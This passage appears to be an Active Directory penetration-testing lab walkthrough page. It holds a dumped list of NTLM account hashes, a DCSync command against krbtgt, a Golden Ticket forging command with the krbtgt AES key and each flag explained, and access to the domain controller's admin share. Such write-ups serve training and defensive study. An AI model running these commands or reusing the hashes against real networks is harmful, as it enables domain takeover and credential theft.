+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003553 (13651)
+User : Support451user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003554 (13652)
+User : Support452user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003555 (13653)
+User : Support453user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003556 (13654)
+User : Support454user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003557 (13655)
+User : Support455user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003558 (13656)
+User : Support456user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003559 (13657)
+User : Support457user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355a (13658)
+User : Support458user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355b (13659)
+User : Support459user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355c (13660)
+User : Support460user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355d (13661)
+User : VPN441user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000355e (13662)
+User : VPN442user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000355f (13663)
+User : VPN443user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003560 (13664)
+User : VPN444user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003561 (13665)
+User : VPN445user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003562 (13666)
+User : VPN446user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003563 (13667)
+User : VPN447user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003564 (13668)
+User : VPN448user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003565 (13669)
+User : VPN449user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003566 (13670)
+User : VPN450user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003567 (13671)
+User : VPN451user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003568 (13672)
+User : VPN452user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003569 (13673)
+User : VPN453user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356a (13674)
+User : VPN454user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356b (13675)
+User : VPN455user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356c (13676)
+User : VPN456user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356d (13677)
+User : VPN457user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356e (13678)
+User : VPN458user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356f (13679)
+User : VPN459user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003570 (13680)
+User : VPN460user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 000003e8 (1000)
+User : DCORP-DC$
+LM   :
+NTLM : 0cfa3b5634cebb44153fa03a3767d396
+
+RID  : 00000451 (1105)
+User : DCORP-ADMINSRV$
+LM   :
+NTLM : b5f451985fd34d58d5120816d31b5565
+
+RID  : 00000452 (1106)
+User : DCORP-APPSRV$
+LM   :
+NTLM : b4cb7bf8b93c78b8051c7906bb054dc5
+
+RID  : 00000453 (1107)
+User : DCORP-CI$
+LM   :
+NTLM : f76f48c176dc09cfd5765843c32809f3
+
+RID  : 00000454 (1108)
+User : DCORP-MGMT$
+LM   :
+NTLM : 0878da540f45b31b974f73312c18e754
+
+RID  : 00000455 (1109)
+User : DCORP-MSSQL$
+LM   :
+NTLM : b205f1ca05bedace801893d6aa5aca27
+
+RID  : 00000456 (1110)
+User : DCORP-SQL1$
+LM   :
+NTLM : 3686dfb420dc0f9635e70c6ca5875b49
+
+RID  : 0000106a (4202)
+User : DCORP-STDADMIN$
+LM   :
+NTLM : e444bbf444732fc38065ea9e9255ab03
+
+RID  : 00003571 (13681)
+User : DCORP-STD441$
+LM   :
+NTLM : 82e28989368af88aa0f035ddff4ad072
+
+RID  : 00003572 (13682)
+User : DCORP-STD442$
+LM   :
+NTLM : e7b7c190753d2ab29967865be6d260de
+
+RID  : 00003573 (13683)
+User : DCORP-STD443$
+LM   :
+NTLM : 2a7d9c0211a1e142cac208d253f33702
+
+RID  : 00003574 (13684)
+User : DCORP-STD444$
+LM   :
+NTLM : b287e868bcff2d38888d2d74c62f7e19
+
+RID  : 00003575 (13685)
+User : DCORP-STD445$
+LM   :
+NTLM : 2e03f920b8f2bc2ccfb7d312d68154bc
+
+RID  : 00003576 (13686)
+User : DCORP-STD446$
+LM   :
+NTLM : d2da89b734dece788a5749e1fe3b269e
+
+RID  : 00003577 (13687)
+User : DCORP-STD447$
+LM   :
+NTLM : 03a5a6659bd09d1a13a17a981154f191
+
+RID  : 00003578 (13688)
+User : DCORP-STD448$
+LM   :
+NTLM : f69a2bce7a6fc3ece8a31b74bbb0a011
+
+RID  : 00003579 (13689)
+User : DCORP-STD449$
+LM   :
+NTLM : b130f0e8b8e9f57dca7cab4c38b9e4cb
+
+RID  : 0000357a (13690)
+User : DCORP-STD450$
+LM   :
+NTLM : 90ea7964ab6f9a8ad85222b4a7a04696
+
+RID  : 0000357b (13691)
+User : DCORP-STD451$
+LM   :
+NTLM : ff6cc4201e8eced9bfb472b4a512be5a
+
+RID  : 0000357c (13692)
+User : DCORP-STD452$
+LM   :
+NTLM : e1492c5446ef8f1d20bbfd7b94621add
+
+RID  : 0000357d (13693)
+User : DCORP-STD453$
+LM   :
+NTLM : 9bb950aacf6af1252ff0c83807d2a7c0
+
+RID  : 0000357e (13694)
+User : DCORP-STD454$
+LM   :
+NTLM : c152cec4f187e3330a8f643f7895d4e8
+
+RID  : 0000357f (13695)
+User : DCORP-STD455$
+LM   :
+NTLM : 5f792dbfde97d440bac506b740f5ec99
+
+RID  : 00003580 (13696)
+User : DCORP-STD456$
+LM   :
+NTLM : 29a12940c0b9b39aff5cc795bec365d3
+
+RID  : 00003581 (13697)
+User : DCORP-STD457$
+LM   :
+NTLM : a74b5162dd8790d322466f592b7bd45a
+
+RID  : 00003582 (13698)
+User : DCORP-STD458$
+LM   :
+NTLM : 2c7ccb4be7427ca4e74ecf0023b92ada
+
+RID  : 00003583 (13699)
+User : DCORP-STD459$
+LM   :
+NTLM : 20a2fd33769d00e27939b054c4813021
+
+RID  : 00003584 (13700)
+User : DCORP-STD460$
+LM   :
+NTLM : 5162999bfd616ca987090aa2f6222f10
+
+RID  : 0000044f (1103)
+User : mcorp$
+LM   :
+NTLM : 7d446c3b1516b4b988d7e07e67b221e5
+
+RID  : 00000450 (1104)
+User : US$
+LM   :
+NTLM : f85385d81cc4936d37ff8f27813f43c6
+
+RID  : 00000458 (1112)
+User : ecorp$
+LM   :
+NTLM : 75788d7b488dbc0dbccff755b53494f0</code></pre>
+
+
+
+<p>We can also run a DCSync attack  from our machine as well.</p>
+<p>Invoke-Mimi -Command '"lsadump::dcsync /user:dcorp\krbtgt"’</p>
+<img src="./images/screenshot_72.png" alt="">
+
+
+
+<h3>Carrying On… Now let’s create our Golden Ticket.</h3>
+
+
+<p>This command creates a Golden Ticket for the "Administrator" user in the "dollarcorp.moneycorp.local" domain, using the specified SID and AES-256 encryption key. The ticket is granted Domain Admins privileges and is set to be valid for 10 hours, with a maximum renewal time of 7 days. The ticket is then injected into the current user's session, allowing the user to impersonate the Administrator account.</p>
+<p>Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</p>
+<p>Allow me to explain the flags used in the Invoke-Mimi -Command command:</p>
+<p>1. /user:Administrator: This flag specifies the user account to be used for the Golden Ticket creation. In this case, it's the "Administrator" account.</p>
+<p>1. /domain:dollarcorp.moneycorp.local: This flag specifies the domain name where the Golden Ticket will be valid.</p>
+<p>1. /sid:S-1-5-21-719815819-3726368948-3917688648: This flag specifies the Security Identifier (SID) of the domain. The SID is a unique identifier for the domain and is required for the Golden Ticket creation.</p>
+<p>1. /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848: This flag specifies the AES-256 encryption key used to encrypt the Golden Ticket. This key is typically obtained by compromising the KRBTGT account's password hash. That’s KRBTGT’s AES256 key.</p>
+<p>1. /id:500: This flag specifies the RID (Relative Identifier) of the user account. The RID 500 corresponds to the built-in Administrator account.</p>
+<p>1. /groups:512: This flag specifies the RID of the Domain Admins group, which is 512. This grants the Golden Ticket the privileges of the Domain Admins group.</p>
+<p>1. /startoffset:0: This flag sets the start time of the Golden Ticket to the current time.</p>
+<p>1. /endin:600: This flag sets the expiration time of the Golden Ticket to 600 minutes (10 hours) from the start time.</p>
+<p>1. /renewmax:10080: This flag sets the maximum renewal time of the Golden Ticket to 10080 minutes (7 days).</p>
+<p>1. /ptt: This flag stands for "Pass-the-Ticket" and instructs Mimikatz to inject the Golden Ticket into the current user's session, effectively impersonating the specified user.</p>
+<img src="./images/screenshot_73.png" alt="">
+
+
+<p>This command creates a Golden Ticket for the "Administrator" user in the "dollarcorp.moneycorp.local" domain, using the specified SID and AES-256 encryption key. The ticket is granted Domain Admins privileges and is set to be valid for 10 hours, with a maximum renewal time of 7 days. The ticket is then injected into the current user's session, allowing the user to impersonate the Administrator account.</p>
+
+<p>AMAZING.</p>
+<p>Now let’s try to access the Domain controller filesystem but before we can also run the command klist to find what ticket we have in session.</p>
+<img src="./images/screenshot_74.png" alt="">
+
+
+<p>We see above that in our Cached Tickets we have 1 ticket which is the Administrator.</p>
+<p>ls \\dcorp-dc\C$</p>
+<img src="./images/screenshot_75.png" alt="">
+
+
+
+<p>We can also execute the command WMI to retrieve information of the Domain Controller.</p>
+<p>gwmi -Class win32_computersystem -ComputerName dcorp-dc</p>
+<img src="./images/screenshot_76.png" alt="">
+
+
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-5-privesc-domain-admin.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">&larr; Previous: Part 5</a>
+  <a href="part-7-silver-ticket.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 7 &rarr;</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
